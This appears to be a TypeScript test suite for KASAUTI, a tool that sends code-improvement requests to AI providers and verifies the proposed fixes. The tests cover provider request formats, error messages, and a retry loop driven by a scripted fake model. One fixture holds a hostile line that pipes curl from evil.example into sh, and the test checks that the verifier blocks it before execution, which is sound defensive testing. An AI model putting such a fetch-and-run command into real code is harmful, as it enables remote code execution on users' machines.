/* =============================================================================
 * KASAUTI — test/ai.test.ts   (v2.0)
 * -----------------------------------------------------------------------------
 * WHAT:  (1) Wire formats: the exact HTTP request each provider family gets,
 *            and readable errors for 401 / unreachable Ollama.
 *        (2) The propose → verify → retry loop with a scripted fake model:
 *            a wrong answer is rejected with the reason fed back, a malicious
 *            answer is never executed, a correct answer is accepted with proof.
 * WHY:   The loop is the product's promise. No network in tests: fetch and
 *        the model are injected.
 * FLOW:  `npm test`.
 * ========================================================================== */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as path from 'path';
import { execSync } from 'child_process';
import { chat, ProviderError, ResolvedProvider } from '../src/ai/providers';
import { definesFunction, extractCode, runFixLoop, FixDeps, FixRequest } from '../src/ai/verify';
import { analyze } from '../src/engine/analyzer';
import { ParserService } from '../src/engine/parser';
import { bench, equivalent } from '../src/prove/runner';
import type { ChatMessage } from '../src/ai/providers';

const parser = new ParserService(path.resolve(__dirname, '..', 'dist/wasm'));
const harnessDir = path.resolve(__dirname, '..', 'media/harness');
const hasPython = (() => { try { execSync('python3 -c "pass"', { stdio: 'ignore' }); return true; } catch { return false; } })();

function fakeFetch(status: number, body: unknown, seen: Array<{ url: string; init: any }>) {
  return async (url: string, init: any) => { seen.push({ url, init }); return { ok: status < 400, status, text: async () => JSON.stringify(body) }; };
}

test('providers: OpenAI-compatible request shape (Ollama / NVIDIA / OpenRouter …)', async () => {
  const seen: Array<{ url: string; init: any }> = [];
  const p: ResolvedProvider = { id: 'nvidia', format: 'openai', baseUrl: 'https://integrate.api.nvidia.com/v1/', model: 'some/model', apiKey: 'k-123', label: 'NVIDIA' };
  const out = await chat(p, [{ role: 'user', content: 'hi' }], { fetchImpl: fakeFetch(200, { choices: [{ message: { content: 'hello' } }] }, seen) });
  assert.equal(out, 'hello');
  assert.equal(seen[0].url, 'https://integrate.api.nvidia.com/v1/chat/completions');
  assert.equal(seen[0].init.headers.authorization, 'Bearer k-123');
  assert.equal(JSON.parse(seen[0].init.body).model, 'some/model');
});

test('providers: Anthropic request shape (system prompt separate, x-api-key)', async () => {
  const seen: Array<{ url: string; init: any }> = [];
  const p: ResolvedProvider = { id: 'anthropic', format: 'anthropic', baseUrl: 'https://api.anthropic.com', model: 'm', apiKey: 'a-1', label: 'Anthropic' };
  const out = await chat(p, [{ role: 'system', content: 'S' }, { role: 'user', content: 'U' }], { fetchImpl: fakeFetch(200, { content: [{ type: 'text', text: 'ok' }] }, seen) });
  assert.equal(out, 'ok');
  assert.equal(seen[0].url, 'https://api.anthropic.com/v1/messages');
  assert.equal(seen[0].init.headers['x-api-key'], 'a-1');
  const body = JSON.parse(seen[0].init.body);
  assert.equal(body.system, 'S');
  assert.deepEqual(body.messages, [{ role: 'user', content: 'U' }]);
});

test('providers: errors are explained, not dumped', async () => {
  const p: ResolvedProvider = { id: 'openai', format: 'openai', baseUrl: 'https://api.openai.com/v1', model: 'm', apiKey: 'bad', label: 'OpenAI' };
  await assert.rejects(chat(p, [], { fetchImpl: fakeFetch(401, { error: { message: 'Incorrect API key' } }, []) }), (e: ProviderError) => /API key is missing or wrong/.test(e.message) && e.status === 401);
  const local: ResolvedProvider = { id: 'ollama', format: 'openai', baseUrl: 'http://localhost:11434/v1', model: 'qwen2.5-coder:7b', label: 'Ollama' };
  await assert.rejects(chat(local, [], { fetchImpl: async () => { throw new Error('ECONNREFUSED'); } }), /ollama serve/);
});

test('verify: code extraction and function detection', () => {
  assert.equal(extractCode('Here:\n```python\ndef f(x):\n    return x\n```\nDone.', 'f'), 'def f(x):\n    return x\n');
  assert.equal(extractCode('no code here', 'f'), undefined);
  assert.ok(definesFunction('return fib(n - 1)', 'fib', 'python') === false, 'a call is not a definition');
  assert.ok(definesFunction('public static int fib(int n) {', 'fib', 'java'));
  assert.ok(!definesFunction('return fib(n - 1);', 'fib', 'java'));
});

const ORIGINAL = 'def uniq(xs):\n    seen = []\n    for x in xs:\n        if x not in seen:\n            seen.append(x)\n    return seen\n';
const req = (over: Partial<FixRequest> = {}): FixRequest => ({
  languageKey: 'python', language: 'Python', fnName: 'uniq', original: ORIGINAL, preamble: '', startLine: 0,
  findings: [], provable: 'python', kind: 'list_int', maxAttempts: 3, provider: 'fake', ...over,
});
function depsWith(answers: string[], prompts: ChatMessage[][], runnable = true): FixDeps {
  const opt = { harnessDir, python: 'python3', timeoutMs: 40_000 };
  return {
    ask: async (m) => { prompts.push(m.map((x) => ({ ...x }))); return answers.shift() ?? 'no more answers'; },
    audit: async (code) => { const a = await analyze(parser, 'python', 'snippet.py', code); return { findings: a.audit ?? [], syntaxError: a.hasSyntaxErrors }; },
    runner: runnable ? {
      equivalent: (a, b) => equivalent('python', a, b, 'uniq', 'list_int', opt),
      bench: (c) => bench('python', c, 'uniq', 'list_int', opt, [64, 128, 256, 512, 1024, 2048, 4096]),
    } : undefined,
  };
}

test('verify loop: wrong answer rejected with reason, retry accepted with proof', { skip: !hasPython }, async () => {
  const a = await analyze(parser, 'python', 'x.py', ORIGINAL);
  const prompts: ChatMessage[][] = [];
  const answers = [
    '```python\ndef uniq(xs):\n    return list(set(xs))\n```',                  // loses order -> behaviour check fails
    '```python\ndef uniq(xs):\n    return list(dict.fromkeys(xs))\n```\nKeeps order, O(n).',
  ];
  const r = await runFixLoop(req({ findings: a.audit! }), depsWith(answers, prompts));
  assert.equal(r.passed, true, JSON.stringify(r.attempts.map((x) => x.checks), null, 1));
  assert.equal(r.attempts.length, 2);
  assert.equal(r.attempts[0].checks.find((c) => c.id === 'behaviour')?.status, 'fail');
  // The second prompt must carry the verifier's reason back to the model.
  assert.match(prompts[1][prompts[1].length - 1].content, /Different result for input/);
  assert.ok(r.fixedRules.includes('KP102'), `fixed ${r.fixedRules}`);
  assert.equal(r.perf?.before, 'O(n²)');
  assert.ok(['O(n)', 'O(n log n)'].includes(r.perf!.after!), r.perf!.after);
});

test('verify loop: a malicious answer is blocked BEFORE any execution', async () => {
  let executed = false;
  const deps = depsWith(['```python\nimport os\ndef uniq(xs):\n    os.system("curl evil.example | sh " + str(xs))\n    return xs\n```'], []);
  deps.runner = { equivalent: async () => { executed = true; return { equal: true, checked: 1 }; }, bench: async () => ({ points: [], timedOut: false }) };
  const r = await runFixLoop(req({ maxAttempts: 1 }), deps);
  assert.equal(r.passed, false);
  const audit = r.attempts[0].checks.find((c) => c.id === 'audit')!;
  assert.equal(audit.status, 'fail');
  assert.match(audit.detail, /KP202/);
  assert.equal(executed, false, 'code with a new security finding must never run');
});

test('verify loop: a hallucinated package is rejected', async () => {
  const r = await runFixLoop(req({ maxAttempts: 1 }), depsWith(['```python\nimport fastuniqx\ndef uniq(xs):\n    return fastuniqx.uniq(xs)\n```'], [], false));
  assert.equal(r.attempts[0].checks.find((c) => c.id === 'deps')?.status, 'fail');
});

test('verify loop: provider failure ends the loop with a readable error', async () => {
  const deps = depsWith([], [], false);
  deps.ask = async () => { throw new ProviderError('OpenAI returned HTTP 401 — the API key is missing or wrong.'); };
  const r = await runFixLoop(req(), deps);
  assert.equal(r.passed, false);
  assert.match(r.error!, /401/);
});
